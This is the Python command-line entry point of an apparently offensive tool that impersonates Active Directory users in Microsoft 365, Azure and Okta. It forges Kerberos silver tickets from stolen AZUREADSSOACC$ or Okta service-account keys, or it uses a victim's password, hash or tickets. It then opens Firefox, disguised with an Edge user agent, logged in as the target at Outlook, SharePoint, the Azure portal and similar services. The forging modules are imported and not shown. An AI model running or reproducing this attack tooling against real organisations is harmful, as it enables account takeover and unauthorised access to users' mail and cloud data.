"""CLI entry point."""

import argparse
import sys
import tempfile

from seamless_sso_browser.forger import forge_tickets
from seamless_sso_browser.kerberos import (
    ccache_from_tgs,
    parse_user_sid,
    tgs_from_credentials,
    tgs_from_tgt,
)
from seamless_sso_browser.launcher import cleanup, find_firefox, launch_firefox
from seamless_sso_browser.profile import create_firefox_profile, create_krb5_conf

OKTA_BASE_DOMAINS = {
    "okta": "okta.com",
    "oktapreview": "oktapreview.com",
    "okta-emea": "okta-emea.com",
    "okta-gov": "okta-gov.com",
}


def _okta_base_domain(okta_domain: str) -> str:
    """Map an --okta-domain cell label to its full base domain."""
    return OKTA_BASE_DOMAINS[okta_domain]


def _derive_okta_spn(okta_org: str, okta_domain: str) -> str:
    """Derive the Okta Agentless DSSO SPN from org and domain."""
    return f"HTTP/{okta_org}.kerberos.{_okta_base_domain(okta_domain)}"


TARGET_PRESETS = {
    "outlook": "https://outlook.office365.com",
    "sharepoint": "https://{tenant}.sharepoint.com",
    "teams": "https://teams.microsoft.com",
    "onedrive": "https://onedrive.live.com",
    "admin": "https://admin.microsoft.com",
    "entra": "https://entra.microsoft.com",
    "azure": "https://portal.azure.com",
}


def _resolve_target(
    parser: argparse.ArgumentParser, target: str, tenant: str | None,
    okta_org: str | None = None, okta_domain: str = "okta",
) -> str:
    """Resolve a target preset name or raw URL to a URL."""
    if target == "okta-dashboard":
        if not okta_org:
            parser.error("--target okta-dashboard requires --okta-org")
        return f"https://{okta_org}.{_okta_base_domain(okta_domain)}"

    if target.startswith("https://") or target.startswith("http://"):
        return target

    if target not in TARGET_PRESETS:
        all_presets = list(TARGET_PRESETS) + ["okta-dashboard"]
        parser.error(
            f"Unknown target '{target}'. Valid presets: {', '.join(all_presets)}. "
            "Or provide a full URL (https://...)."
        )

    url = TARGET_PRESETS[target]
    if "{tenant}" in url:
        if not tenant:
            parser.error(f"--target {target} requires --tenant")
        url = url.format(tenant=tenant)
    return url


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="seamless-sso-browser",
        description=(
            "Authenticate via Seamless SSO and launch Firefox as the target user."
        ),
    )

    parser.add_argument("--domain", required=True, help="AD domain (e.g. domain.local)")
    parser.add_argument("--user", help="Target sAMAccountName")
    parser.add_argument("--upn", help="Target UPN (e.g. jsmith@domain.com), for display")
    parser.add_argument("--dc-ip", help="Domain controller address")
    parser.add_argument("--user-sid", help="Full user SID (e.g. S-1-5-21-...-1234)")

    parser.add_argument(
        "--idp", choices=["azure", "okta"], default="azure",
        help="Target identity provider (default: azure)"
    )

    parser.add_argument(
        "--okta-org",
        help="Okta org subdomain (e.g. mycompany). Required when --idp okta."
    )
    parser.add_argument(
        "--okta-domain", choices=["okta", "oktapreview", "okta-emea", "okta-gov"],
        default="okta",
        help="Okta environment variant (default: okta)"
    )
    parser.add_argument(
        "--okta-svc-aes",
        help="AES key of the Okta DSSO service account (hex)"
    )

    forgery_group = parser.add_mutually_exclusive_group()
    forgery_group.add_argument("--adssoacc-ntlm", help="AZUREADSSOACC$ NTLM hash (hex)")
    forgery_group.add_argument("--adssoacc-aes", help="AZUREADSSOACC$ AES key (hex)")

    cred_group = parser.add_mutually_exclusive_group()
    cred_group.add_argument("--password", help="Target user's password")
    cred_group.add_argument(
        "--user-password-hash", help="Target user's NTLM hash ([LMHASH:]NTHASH)"
    )
    cred_group.add_argument("--user-aes-key", help="Target user's AES key (hex)")

    parser.add_argument("--tgt", help="Pre-obtained TGT (file path or base64)")
    parser.add_argument("--tgs", help="Pre-obtained TGS (file path or base64)")
    parser.add_argument("--ccache", help="Path to pre-forged ccache (skip all auth)")

    parser.add_argument(
        "--useragent", help="Custom user-agent string (default: Edge on Windows 11)"
    )
    parser.add_argument("--no-cleanup", action="store_true", help="Preserve temp artifacts")
    parser.add_argument("--firefox-path", help="Path to Firefox binary")
    parser.add_argument(
        "--target",
        default="outlook",
        help="Target app preset or URL (default: outlook). "
        f"Presets: {', '.join(list(TARGET_PRESETS) + ['okta-dashboard'])}",
    )
    parser.add_argument("--tenant", help="M365 tenant name (required for --target sharepoint)")
    parser.add_argument("--verbose", action="store_true", help="Print debug info")

    args = parser.parse_args(argv)

    args.target_url = _resolve_target(
        parser, args.target, args.tenant,
        okta_org=args.okta_org, okta_domain=args.okta_domain,
    )

    _validate_mode(parser, args)

    return args


def _validate_mode(parser: argparse.ArgumentParser, args: argparse.Namespace) -> None:
    # IDP cross-checks -- Okta flags require --idp okta
    if args.okta_svc_aes and args.idp != "okta":
        parser.error("--okta-svc-aes requires --idp okta")
    if args.okta_domain != "okta" and args.idp != "okta":
        parser.error("--okta-domain requires --idp okta")
    if args.idp == "okta" and (args.adssoacc_ntlm or args.adssoacc_aes):
        parser.error(
            "--adssoacc-ntlm and --adssoacc-aes are not valid with --idp okta. "
            "Use --okta-svc-aes for Okta forgery."
        )

    # --okta-org required for --idp okta except in ccache/tgs modes
    if args.idp == "okta" and not args.okta_org:
        has_tgs = args.tgs is not None
        has_ccache = args.ccache is not None
        if not (has_tgs or has_ccache):
            parser.error(
                "--okta-org is required when --idp okta "
                "(except in --tgs or --ccache mode)"
            )

    has_forgery = args.adssoacc_ntlm or args.adssoacc_aes or args.okta_svc_aes
    has_creds = args.password or args.user_password_hash or args.user_aes_key
    has_tgt = args.tgt is not None
    has_tgs = args.tgs is not None
    has_ccache = args.ccache is not None

    modes = sum(bool(x) for x in [has_forgery, has_creds, has_tgt, has_tgs, has_ccache])
    if modes > 1:
        parser.error(
            "Conflicting auth modes. Use exactly one of: "
            "AZUREADSSOACC forgery (--adssoacc-ntlm/--adssoacc-aes), "
            "user credentials (--password/--user-password-hash/--user-aes-key), "
            "--tgt, --tgs, or --ccache."
        )
    if modes == 0:
        parser.error(
            "No auth mode specified. Provide one of: "
            "--adssoacc-ntlm, --adssoacc-aes, --password, "
            "--user-password-hash, --user-aes-key, --tgt, --tgs, or --ccache."
        )

    if has_ccache:
        return

    if has_tgs:
        return

    if has_tgt:
        missing = []
        if not args.dc_ip:
            missing.append("--dc-ip")
        if missing:
            parser.error(f"TGT mode requires: {', '.join(missing)}")
        return

    if has_creds:
        missing = []
        if not args.dc_ip:
            missing.append("--dc-ip")
        if not args.user:
            missing.append("--user")
        if missing:
            parser.error(f"Credential mode requires: {', '.join(missing)}")
        return

    if has_forgery:
        missing = []
        if not args.user_sid:
            missing.append("--user-sid")
        if not args.user:
            missing.append("--user")
        if missing:
            parser.error(f"Forgery mode requires: {', '.join(missing)}")
        return


def main() -> None:
    args = parse_args(sys.argv[1:])

    firefox_path = find_firefox(args.firefox_path)

    if args.idp == "okta":
        okta_spn = _derive_okta_spn(args.okta_org, args.okta_domain)
        spn_list = [okta_spn]
        trusted_uris = (
            f"https://{args.okta_org}.kerberos.{_okta_base_domain(args.okta_domain)}"
        )
        sso_hosts = [okta_spn.split("/", 1)[1]]  # domain_realm mapping for krb5.conf
    else:
        spn_list = None 
        trusted_uris = None 
        sso_hosts = None 

    temp_dir = tempfile.mkdtemp(prefix="sso-")
    ccache_is_ours = False

    display_name = args.upn or args.user or "target"

    try:
        if args.ccache:
            print(f"[*] Using pre-forged ccache: {args.ccache}")
            ccache_path = args.ccache
        elif args.tgs:
            print(f"[*] Importing TGS from: {args.tgs}")
            ccache_path = ccache_from_tgs(args.tgs, temp_dir)
            ccache_is_ours = True
            print("[+] TGS imported successfully")
        elif args.tgt:
            print(f"[*] Importing TGT from: {args.tgt}")
            if args.idp == "okta":
                print(f"[*] Requesting TGS from DC {args.dc_ip} for Okta SSO SPN")
            else:
                print(f"[*] Requesting TGS from DC {args.dc_ip} for SSO SPNs")
            ccache_path = tgs_from_tgt(
                args.tgt, args.domain, args.dc_ip, temp_dir, spns=spn_list,
            )
            ccache_is_ours = True
            if args.idp == "okta":
                print("[+] TGS ticket obtained for Okta SSO SPN")
            else:
                print("[+] TGS tickets obtained for both SSO SPNs")
        elif args.password or args.user_password_hash or args.user_aes_key:
            cred_type = (
                "password" if args.password
                else "NTLM hash" if args.user_password_hash
                else "AES key"
            )
            print(f"[*] Authenticating as {display_name} using {cred_type}")
            print(f"[*] Requesting TGT from DC {args.dc_ip}")
            ccache_path = tgs_from_credentials(
                domain=args.domain,
                dc_ip=args.dc_ip,
                username=args.user,
                work_dir=temp_dir,
                password=args.password,
                nthash=args.user_password_hash,
                aes_key=args.user_aes_key,
                spns=spn_list,
            )
            ccache_is_ours = True
            print("[+] TGT obtained")
            if args.idp == "okta":
                print("[+] TGS ticket obtained for Okta SSO SPN")
            else:
                print("[+] TGS tickets obtained for both SSO SPNs")
        else:
            domain_sid, user_rid = parse_user_sid(args.user_sid)
            if args.idp == "okta":
                forge_aes = args.okta_svc_aes
                forge_ntlm = None
                print("[*] Forging silver ticket using Okta DSSO service account AES key")
            else:
                forge_aes = args.adssoacc_aes
                forge_ntlm = args.adssoacc_ntlm
                key_type = "NTLM hash" if args.adssoacc_ntlm else "AES key"
                print(f"[*] Forging silver tickets using AZUREADSSOACC$ {key_type}")
            print(f"[*] Target user: {display_name} (RID {user_rid})")
            ccache_path = forge_tickets(
                domain=args.domain,
                domain_sid=domain_sid,
                user=args.user,
                user_rid=user_rid,
                work_dir=temp_dir,
                adssoacc_ntlm=forge_ntlm,
                adssoacc_aes=forge_aes,
                spns=spn_list,
            )
            ccache_is_ours = True
            if args.idp == "okta":
                print(f"[+] Forged TGS for {okta_spn}")
            else:
                print("[+] Forged TGS for HTTP/autologon.microsoftazuread-sso.com")
                print("[+] Forged TGS for HTTP/aadg.windows.net.nsatc.net")
                print("[+] Tickets merged into combined ccache")

        if args.idp == "okta":
            print("[*] Configuring Firefox profile for Okta Agentless Desktop SSO")
        else:
            print("[*] Configuring Firefox profile for Seamless SSO")
        profile_dir = create_firefox_profile(
            temp_dir=temp_dir,
            useragent=args.useragent,
            trusted_uris=trusted_uris,
        )

        krb5_conf_path = create_krb5_conf(
            temp_dir=temp_dir, domain=args.domain, sso_hosts=sso_hosts
        )
        print(f"[*] Kerberos realm: {args.domain.upper()}")

        print()
        print(f"[*] Launching Firefox as {display_name}")
        print(f"[*] Target: {args.target_url}")
        print()
        print("[*] When the login page appears, enter the user's email and press Enter.")
        print("[*] Seamless SSO will handle the rest — no password prompt should appear.")
        print()
        print("[*] Close Firefox to clean up. Ctrl+C to abort.")

        launch_firefox(
            firefox_path=firefox_path,
            profile_dir=profile_dir,
            ccache_path=ccache_path,
            krb5_conf_path=krb5_conf_path,
            target_url=args.target_url,
            verbose=args.verbose,
        )
    finally:
        if args.no_cleanup:
            print(f"[*] Artifacts preserved at: {temp_dir}")
            if ccache_is_ours:
                print(f"[*] Ccache: {ccache_path}")
        else:
            cleanup(temp_dir, ccache_path if ccache_is_ours else None)
            print("[*] Cleaned up.")
